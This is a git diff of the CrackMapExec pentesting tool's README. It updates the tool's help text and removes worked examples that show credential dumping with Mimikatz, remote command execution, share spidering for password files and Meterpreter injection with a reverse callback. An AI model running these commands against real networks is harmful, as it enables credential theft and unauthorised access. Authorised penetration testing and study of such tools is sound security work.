@@ -40,43 +40,53 @@ Run ```pip install --upgrade -r requirements.txt```
 |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
  \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|
 
-                Swiss army knife for pentesting Windows/Active Directory environments | @byt3bl33d3r
+                 Swiss army knife for pentesting Windows/Active Directory environments | @byt3bl33d3r
 
-                      Powered by Impacket https://github.com/CoreSecurity/impacket (@agsolino)
+                       Powered by Impacket https://github.com/CoreSecurity/impacket (@agsolino)
 
-                                                  Inspired by:
-                           @ShawnDEvans's smbmap https://github.com/ShawnDEvans/smbmap
-                           @gojhonny's CredCrack https://github.com/gojhonny/CredCrack
-                           @pentestgeek's smbexec https://github.com/pentestgeek/smbexec
+                                                   Inspired by:
+                            @ShawnDEvans's smbmap https://github.com/ShawnDEvans/smbmap
+                            @gojhonny's CredCrack https://github.com/gojhonny/CredCrack
+                            @pentestgeek's smbexec https://github.com/pentestgeek/smbexec
+                                                     
+                                                  Version: 2.0
+                               Codename: 'I gotta change the name of this thing'
 
 positional arguments:
   target                The target range, CIDR identifier or file containing targets
 
 optional arguments:
   -h, --help            show this help message and exit
+  -v, --version         show program's version number and exit
   -t THREADS            Set how many concurrent threads to use (defaults to 10)
   -u USERNAME           Username(s) or file containing usernames
   -p PASSWORD           Password(s) or file containing passwords
   -H HASH               NTLM hash(es) or file containing NTLM hashes
   -C COMBO_FILE         Combo file containing a list of domain\username:password or username:password entries
+  -k HEX_KEY            AES key to use for Kerberos Authentication (128 or 256 bits)
   -d DOMAIN             Domain name
-  -n NAMESPACE          WMI Namespace (default //./root/cimv2)
+  -n NAMESPACE          WMI Namespace (default: //./root/cimv2)
   -s SHARE              Specify a share (default: C$)
+  --kerb                Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters
   --port {139,445}      SMB port (default: 445)
-  --https               Serve everything over https instead of http
-  -v                    Enable verbose output
+  --server {http,https}
+                        Use the selected server (defaults to http)
+  --verbose             Enable verbose output
 
 Credential Gathering:
   Options for gathering credentials
 
   --sam                 Dump SAM hashes from target systems
-  --mimikatz            Run Invoke-Mimikatz (sekurlsa::logonpasswords) on target systems
-  --mimikatz-cmd MIMIKATZ_CMD
-                        Run Invoke-Mimikatz with the specified command
+  --lsa                 Dump LSA secrets from target systems
   --ntds {ninja,vss,drsuapi}
                         Dump the NTDS.dit from target DCs using the specifed method
                         (drsuapi is the fastest)
-  --enable-wdigest      Creates the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows 8.1
+  --ntds-history        Dump NTDS.dit password history
+  --ntds-pwdLastSet     Shows the pwdLastSet attribute for each NTDS.dit account
+  --mimikatz            Run Invoke-Mimikatz (sekurlsa::logonpasswords) on target systems
+  --mimikatz-cmd MIMIKATZ_CMD
+                        Run Invoke-Mimikatz with the specified command
+  --enable-wdigest      Creates the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
   --disable-wdigest     Deletes the 'UseLogonCredential' registry key
 
 Mapping/Enumeration:
@@ -87,7 +97,8 @@ Mapping/Enumeration:
   --sessions            Enumerate active sessions
   --disks               Enumerate disks
   --users               Enumerate users
-  --rid-brute MAX_RID   Enumerate users by bruteforcing RID's
+  --rid-brute [MAX_RID]
+                        Enumerate users by bruteforcing RID's (defaults to 4000)
   --pass-pol            Dump password policy
   --lusers              Enumerate logged on users
   --wmi QUERY           Issues the specified WMI query
@@ -99,17 +110,18 @@ Spidering:
   --content             Enable file content searching
   --exclude-dirs DIR_LIST
                         Directories to exclude from spidering
-  --pattern PATTERN     Pattern to search for in folders, filenames and file content (if enabled)
+  --pattern PATTERN     Pattern to search for in folders, filenames and file content
   --patternfile PATTERNFILE
-                        File containing patterns to search for in folders, filenames and file content (if enabled)
+                        File containing patterns to search for in folders, filenames and file content
   --depth DEPTH         Spider recursion depth (default: 10)
 
 Command Execution:
   Options for executing commands
 
   --execm {atexec,wmi,smbexec}
-                        Method to execute the command (default: smbexec)
+                        Method to execute the command (default: wmi)
   --force-ps32          Force all PowerShell code/commands to run in a 32bit process
+  --no-output           Do not retrieve command output
   -x COMMAND            Execute the specified command
   -X PS_COMMAND         Excute the specified powershell command
 
@@ -137,175 +149,10 @@ There's been an awakening... have you felt it?
 ```
 
 #Examples
-
-The most basic usage: scans the subnet using 100 concurrent threads:
-```
-#~ python crackmapexec.py -t 100 172.16.206.0/24
-[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
-```
-
-Quick credential validation:
-```
-#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password
-[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
-[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
-[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
-[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
-```
-
-Specify multiple user/pass combinations from the command line or a file:
-```
-#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username1,username2 -p password1,password2
-[*] 192.168.2.5:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[*] 192.168.2.6:445 is running Windows 6.3 Build 9600 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
-[-] 192.168.2.5:445 'DRUGCOMPANY-PC\username1:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
-[-] 192.168.2.5:445 'DRUGCOMPANY-PC\username2:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
-[+] 192.168.2.5:445 Login successful 'HRBOX\username1:password2'
-[-] 192.168.2.6:445 'DESKTOP-QDVNP6B\username2:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
-[-] 192.168.2.6:445 'DESKTOP-QDVNP6B\username1:password1' SMB SessionError: STATUS_LOGON_FAILURE ...
-[+] 192.168.2.6:445 Login successful 'DESKTOP-QDVNP6B\username1:password2'
-```
-
-Let's enumerate available shares:
-```
-#~  python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --shares
-[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
-[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
-[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
-[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
-[+] 172.16.206.130:445 DESKTOP-QDVNP6B Available shares:
-	SHARE			Permissions
-	-----			-----------
-	ADMIN$			READ, WRITE
-	IPC$			NO ACCESS
-	C$			    READ, WRITE
-[+] 172.16.206.133:445 DRUGOUTCOVE-PC Available shares:
-	SHARE			Permissions
-	-----			-----------
-	Users			READ, WRITE
-	ADMIN$			READ, WRITE
-	IPC$			NO ACCESS
-	C$			    READ, WRITE
-[+] 172.16.206.132:445 DRUGCOMPANY-PC Available shares:
-	SHARE			Permissions
-	-----			-----------
-	Users			READ, WRITE
-	ADMIN$			READ, WRITE
-	IPC$			NO ACCESS
-	C$			    READ, WRITE
-```
-
-Let's execute some commands on all systems concurrently:
-
-```
-#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password -x whoami
-[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
-[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
-[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
-[+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via SMBEXEC
-nt authority\system
-
-[+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via SMBEXEC
-nt authority\system
-
-[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
-[+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via SMBEXEC
-nt authority\system
-```
-
-Same as above only using WMI as the code execution method:
-```
-#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --execm wmi -x whoami
-[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
-[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
-[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
-[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
-[+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via WMI
-drugcompany-pc\administrator
-
-[+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via WMI
-drugoutcove-pc\administrator
-
-[+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via WMI
-desktop-qdvnp6b\drugdealer
-```
-
-Use an IEX cradle to run ```Invoke-Mimikatz.ps1``` on all systems concurrently (PS script gets hosted automatically with an HTTP server),
-Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file and parsed for clear-text credentials:
-```
-#~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --mimikatz
-[*] Press CTRL-C at any time to exit
-[*] Note: This might take some time on large networks! Go grab a redbull!
-
-[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
-[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
-[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
-[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
-172.16.206.130 - - [19/Aug/2015 18:57:40] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
-172.16.206.133 - - [19/Aug/2015 18:57:40] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
-172.16.206.132 - - [19/Aug/2015 18:57:41] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
-172.16.206.133 - - [19/Aug/2015 18:57:45] "POST / HTTP/1.1" 200 -
-[+] 172.16.206.133 Found plain text creds! Domain: drugoutcove-pc Username: drugdealer Password: IloveMETH!@$
-[*] 172.16.206.133 Saved POST data to Mimikatz-172.16.206.133-2015-08-19_18:57:45.log
-172.16.206.130 - - [19/Aug/2015 18:57:47] "POST / HTTP/1.1" 200 -
-[*] 172.16.206.130 Saved POST data to Mimikatz-172.16.206.130-2015-08-19_18:57:47.log
-172.16.206.132 - - [19/Aug/2015 18:57:48] "POST / HTTP/1.1" 200 -
-[+] 172.16.206.132 Found plain text creds! Domain: drugcompany-PC Username: drugcompany Password: IloveWEED!@#
-[+] 172.16.206.132 Found plain text creds! Domain: DRUGCOMPANY-PC Username: drugdealer Password: D0ntDoDrugsKIDS!@#
-[*] 172.16.206.132 Saved POST data to Mimikatz-172.16.206.132-2015-08-19_18:57:48.log
-``` 
-
-Lets spider the C$ share starting from the ```Users``` folder for the pattern ```password``` in all files and directories (concurrently):
-```
-#~ python crackmapexec.py -t 150 172.16.206.0/24 -u username -p password --spider Users --depth 10 --pattern password
-[*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
-[*] 172.16.206.133:445 is running Windows 6.3 Build 9600 (name:DRUGOUTCOVE-PC) (domain:DRUGOUTCOVE-PC)
-[+] 172.16.206.132:445 Login successful 'DRUGCOMPANY-PC\username:password'
-[+] 172.16.206.133:445 Login successful 'DRUGOUTCOVE-PC\username:password'
-[+] 172.16.206.132:445 DRUGCOMPANY-PC Started spidering
-[*] 172.16.206.130:445 is running Windows 10.0 Build 10240 (name:DESKTOP-QDVNP6B) (domain:DESKTOP-QDVNP6B)
-[+] 172.16.206.130:445 Login successful 'DESKTOP-QDVNP6B\username:password'
-[+] 172.16.206.133:445 DRUGOUTCOVE-PC Started spidering
-[+] 172.16.206.130:445 DESKTOP-QDVNP6B Started spidering
-//172.16.206.132/Users/drugcompany/AppData/Roaming/Microsoft/Windows/Recent/supersecrepasswords.lnk
-//172.16.206.132/Users/drugcompany/AppData/Roaming/Microsoft/Windows/Recent/supersecretpasswords.lnk
-//172.16.206.132/Users/drugcompany/Desktop/supersecretpasswords.txt
-[+] 172.16.206.132:445 DRUGCOMPANY-PC Done spidering (Completed in 7.0349509716)
-//172.16.206.133/Users/drugdealerboss/Documents/omgallthepasswords.txt
-[+] 172.16.206.133:445 DRUGOUTCOVE-PC Done spidering (Completed in 16.2127850056)
-//172.16.206.130/Users/drugdealer/AppData/Roaming/Microsoft/Windows/Recent/superpasswords.txt.lnk
-//172.16.206.130/Users/drugdealer/Desktop/superpasswords.txt.txt
-[+] 172.16.206.130:445 DESKTOP-QDVNP6B Done spidering (Completed in 38.6000130177)
-```
-
-Directly inject Meterpreter into memory forcing the Powershell code to run in a 32bit process
-```
-#~ python crackmapexec.py -t 100 192.168.2.5-6 -u username -p password --force-ps32 --inject met_reverse_https --met-options 192.168.2.1 4545
-[*] Press CTRL-C at any time to exit
-[*] Note: This might take some time on large networks! Go grab a redbull!
-
-[*] 192.168.2.5:445 is running Windows 6.1 Build 7601 (name:HRBOX) (domain:HRBOX)
-[*] 192.168.2.6:445 is running Windows 6.3 Build 9600 (name:AVERAGEJOEBOX) (domain:AVERAGEJOEBOX)
-[+] 192.168.2.5:445 Login successful 'HRBOX\username:password'
-[+] 192.168.2.6:445 Login successful 'AVERAGEJOEBOX\username:password'
-192.168.2.6 - - [08/Oct/2015 12:50:56] "GET /Invoke-Shellcode.ps1 HTTP/1.1" 200 -
-192.168.2.5 - - [08/Oct/2015 12:50:58] "GET /Invoke-Shellcode.ps1 HTTP/1.1" 200 -
-```
+Yo put some screenshots here
 
 #To do
-- Kerberos support
+- ~~Kerberos support~~
 - ~~Execute custom commands with mimikatz~~
 - Modularize the script (??)
 - Anything that could be useful!
